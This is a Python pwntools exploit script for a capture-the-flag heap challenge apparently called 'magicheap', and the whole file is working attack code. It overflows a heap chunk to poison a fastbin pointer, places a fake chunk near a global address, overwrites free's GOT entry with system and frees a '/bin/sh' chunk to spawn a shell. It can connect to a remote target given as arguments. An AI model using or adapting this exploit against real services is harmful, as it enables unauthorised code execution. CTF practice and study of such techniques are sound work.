#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('magicheap_patched')
libc = exe.libc
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
directory /tmp/learn/malloc
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def create(size, data):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", str(size).encode())
    io.sendafter(b":", data)

def edit(idx, size, data):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", str(size).encode())
    io.sendafter(b":", data)

def delete(idx):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b":", str(idx).encode())


def solve():

    addr = 0x6020ad
    create(0x60, b"A"*8)
    create(0x60, b"B"*8)

    delete(1)
    edit(0, 0x80, b"A"*0x68 + p64(0x71) + p64(addr))

    create(0x60, b"/bin/sh\x00")
    create(0x60, b"A"*0x23 + p64(exe.got["free"]))
    edit(0, 8, p64(exe.plt["system"]))
    delete(1)
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

